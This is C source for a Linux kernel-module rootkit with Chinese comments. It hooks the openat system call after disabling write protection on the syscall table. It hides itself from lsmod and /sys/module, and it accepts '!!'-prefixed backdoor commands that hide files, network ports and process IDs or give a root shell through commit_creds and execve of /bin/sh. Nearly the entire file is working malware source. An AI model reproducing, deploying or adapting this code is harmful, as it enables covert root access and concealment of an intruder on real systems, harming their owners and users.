#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>

#include <linux/syscalls.h>
#include <linux/kprobes.h>
#include <linux/uaccess.h>

MODULE_LICENSE("GPL");

#include "util.h"
#include "hide_pid.h"
#include "hide_file.h"
#include "hide_port.h"

//static asmlinkage long my_sys_openat(void *dfd, const char __user *filename, int flags, umode_t mode);
// 新内核使用了新的调用约定
static long my_sys_openat(const struct pt_regs *regs);

static void **real_sys_call_table = 0;
static char command[PATH_MAX];

//static asmlinkage long (*real_sys_openat)(int dfd, const char __user *filename, int flags, umode_t mode); // 保持参数在 stack 中
static syscall_fun real_sys_openat;

void hide_self(void)
{
    fm_info("Hidden module begin.\n");
    //Hide this module from kernel modules(lsmod | grep [module])
    list_del_init(&__this_module.list);

    //Hide this module from /sys/module
    kobject_del(&__this_module.mkobj.kobj);
    fm_info("Hello world, our rootkit(hide module itself) module successfully loaded\n");
}

// static void **get_syscall_table(void) // 暴力搜索 ksys_close 的地址
// {
//     // linux kernel 4.17 把 sys_close 重命名为了 ksys_close
//     void **addr = (void **)__x64_sys_read_addr;

//     fm_info("finding syscall table from: %p", (void *)addr);

//     while (addr < (void **)ULLONG_MAX)
//     {

//         if (addr[__NR_read] == (void *)__x64_sys_read_addr)
//         {

//             fm_info("sys call table found: %p", (void *)addr);
//             return addr;
//         }
//         addr++;
//     }

//     return NULL;
// }

// Credit to: Filip Pynckels - MIT/GPL dual (http://users.telenet.be/pynckels/2020-2-Linux-kernel-unexported-kallsyms-functions.pdf)
// unsigned long lookup_name(const char *name)
// {
//     struct kprobe kp;
//     unsigned long retval;

//     memset(&kp, 0, sizeof(struct kprobe));

//     kp.symbol_name = name;
//     if (register_kprobe(&kp) < 0)
//         return 0;
//     retval = (unsigned long)kp.addr;
//     unregister_kprobe(&kp);
//     return retval;
// }

static int lkm_init(void)
{
    real_sys_call_table = (void *)kallsyms_lookup_name("sys_call_table");

    if (!real_sys_call_table)
    {
        fm_info("sys call table not found");
        return -EFAULT;
    }
    fm_info("real_sys_call_table: %p", real_sys_call_table);

    if (!hide_port_init(real_sys_call_table))
    {
        fm_info("hide_port_init fail!");
        return -EFAULT;
    }

    if (!hide_file_init())
    {
        hide_port_exit(real_sys_call_table);
        fm_info("hide_file_init fail!");
        return -EFAULT;
    }

    real_sys_openat = (void *)real_sys_call_table[__NR_openat];
    disable_wp();
    real_sys_call_table[__NR_openat] = (void *)my_sys_openat;
    enable_wp();

    fm_info("update __NR_openat: %p->%p", real_sys_openat, my_sys_openat);

    fm_info("rootkit load!");
    return 0;
}

static void lkm_exit(void)
{
    hide_port_exit(real_sys_call_table);
    hide_file_exit();
    hide_pid_exit();
    disable_wp();
    real_sys_call_table[__NR_openat] = (void *)real_sys_openat;
    enable_wp();
    fm_info("Module removed.");
}

#define BACKDOOR_PREFIX "!!"
#define HIDE_FILE "!!hide_file"
#define UNHIDE_FILE "!!unhide_file"
#define HIDE_PORT "!!hide_port"
#define UNHIDE_PORT "!!unhide_port"
#define HIDE_PID "!!hide_pid"
#define UNHIDE_PID "!!unhide_pid"
#define GET_ROOT_SHELL "!!get_root_shell"

static long my_sys_openat(const struct pt_regs *regs)
{
    // int dfd, const char __user *filename, int flags, umode_t mode
    struct pt_regs user_regs;
    enum net_type type;
    int port;
    pid_t pid_num;
    memcpy(&user_regs, regs, sizeof(struct pt_regs));

    if (strncpy_from_user(command, (void *)regs->si, PATH_MAX) < 0)
    {
        fm_info("strncpy_from_user fail.");
        return -EFAULT;
    }

    if (strncmp(command, BACKDOOR_PREFIX, strlen(BACKDOOR_PREFIX)) == 0)
    {
        fm_info("my_sys_openat: %s", command);
        if (strncmp(command, HIDE_FILE, strlen(HIDE_FILE)) == 0)
        {
            hide_file(&command[strlen(HIDE_FILE) + 1]);
        }
        else if (strncmp(command, UNHIDE_FILE, strlen(UNHIDE_FILE)) == 0)
        {
            unhide_file(&command[strlen(UNHIDE_FILE) + 1]);
        }
        else if (strncmp(command, GET_ROOT_SHELL, strlen(GET_ROOT_SHELL)) == 0)
        {
            commit_creds(prepare_kernel_cred(0));
            // execve 会调用 getfilename, 如果地址不在用户空间会调用失败, 需要手动把 /bin/sh 拷贝到用户空间
            user_regs.di = user_regs.si;
            // copy_to_user_mcsafe 调用成功返回 0
            if (!copy_to_user_mcsafe((void *)user_regs.di, (const void *)"/bin/sh", 8))
            {
                user_regs.si = 0;
                user_regs.dx = 0;
                ((syscall_fun)real_sys_call_table[__NR_execve])(&user_regs);
            }
        }
        else if (strncmp(command, HIDE_PORT, strlen(HIDE_PORT)) == 0)
        {
            if (parse_hide_port_command(&command[strlen(HIDE_PORT) + 1], &type, &port))
            {
                hide_port(type, port);
            }
            else
            {
                fm_info("parse hide port command fail.");
            }
        }
        else if (strncmp(command, UNHIDE_PORT, strlen(UNHIDE_PORT)) == 0)
        {
            if (parse_hide_port_command(&command[strlen(UNHIDE_PORT) + 1], &type, &port))
            {
                unhide_port(type, port);
            }
            else
            {
                fm_info("parse unhide port command fail.");
            }
        }
        else if (strncmp(command, HIDE_PID, strlen(HIDE_PID)) == 0)
        {
            if (sscanf(&command[strlen(HIDE_PID) + 1], "%d", &pid_num) == 1) {
                hide_pid(pid_num);
            } else {
                fm_info("parse hide pid command fail.");

            }
        }
        else if (strncmp(command, UNHIDE_PID, strlen(UNHIDE_PID)) == 0)
        {
            if (sscanf(&command[strlen(UNHIDE_PID) + 1], "%d", &pid_num) == 1) {
                unhide_pid(pid_num);
            } else {
                fm_info("parse unhide pid command fail.");
            }
        }
        else
        {
            return real_sys_openat(regs);
        }
    }
    else
    {
        return real_sys_openat(regs);
    }
    return -EFAULT;
}

module_init(lkm_init);
module_exit(lkm_exit);